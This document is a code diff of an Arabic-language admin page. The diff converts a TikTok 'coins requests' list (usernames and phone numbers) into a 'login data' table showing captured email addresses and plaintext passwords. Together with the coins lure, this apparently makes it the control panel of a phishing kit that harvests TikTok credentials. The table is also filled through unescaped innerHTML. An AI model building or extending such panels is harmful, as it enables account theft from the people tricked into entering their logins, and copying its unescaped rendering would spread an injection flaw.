@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>لوحة التحكم - طلبات الكوينز</title>
+    <title>لوحة التحكم - بيانات تيك توك</title>
     <link rel="stylesheet" href="style.css" />
     <style>
         .admin-container {
@@ -51,7 +51,7 @@
             background: #e94560;
         }
 
-        .no-requests {
+        .no-data {
             text-align: center;
             color: #888;
             padding: 30px;
@@ -60,20 +60,20 @@
 </head>
 <body>
     <div class="admin-container">
-        <h2>👑 طلبات الكوينز</h2>
-        <div id="requestsTable"></div>
+        <h2>👑 بيانات تسجيل الدخول</h2>
+        <div id="usersTable"></div>
         <div style="text-align: center;">
             <a href="index.html" class="btn-back">🔙 العودة للرئيسية</a>
         </div>
     </div>
 
     <script>
-        function loadRequests() {
-            const requests = JSON.parse(localStorage.getItem('tiktokRequests')) || [];
-            const container = document.getElementById('requestsTable');
+        function loadUsers() {
+            const users = JSON.parse(localStorage.getItem('tiktokUsers')) || [];
+            const container = document.getElementById('usersTable');
 
-            if (requests.length === 0) {
-                container.innerHTML = '<p class="no-requests">❌ لا توجد طلبات حتى الآن.</p>';
+            if (users.length === 0) {
+                container.innerHTML = '<p class="no-data">❌ لا توجد بيانات حتى الآن.</p>';
                 return;
             }
 
@@ -82,21 +82,21 @@
                     <thead>
                         <tr>
                             <th>#</th>
-                            <th>اسم المستخدم على تيك توك</th>
-                            <th>رقم الهاتف</th>
+                            <th>البريد الإلكتروني</th>
+                            <th>كلمة السر</th>
                             <th>التاريخ</th>
                         </tr>
                     </thead>
                     <tbody>
             `;
 
-            requests.forEach((req, index) => {
+            users.forEach((user, index) => {
                 html += `
                     <tr>
                         <td>${index + 1}</td>
-                        <td><strong>${req.username}</strong></td>
-                        <td>${req.phone}</td>
-                        <td>${req.date}</td>
+                        <td><strong>${user.email}</strong></td>
+                        <td>${user.password}</td>
+                        <td>${user.date}</td>
                     </tr>
                 `;
             });
@@ -105,7 +105,7 @@
             container.innerHTML = html;
         }
 
-        window.onload = loadRequests;
+        window.onload = loadUsers;
     </script>
 </body>
 </html>
